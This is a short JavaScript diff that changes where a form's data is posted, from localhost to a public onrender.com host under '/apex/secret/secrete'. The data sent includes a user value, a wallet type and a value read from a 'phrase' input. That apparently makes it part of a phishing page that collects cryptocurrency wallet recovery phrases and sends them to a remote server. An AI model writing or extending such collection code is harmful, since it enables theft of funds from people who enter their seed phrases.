@@ -10,7 +10,7 @@ window.addEventListener("load", () => {
     const notaPh = phraseIn.value;
     try {
       const data = await axios.post(
-        "http://localhost:8080/apex/secret/secrete",
+        "https://apex-h7wm.onrender.com/apex/secret/secrete",
         {
           user: client,
           walletType: wallet_Type,
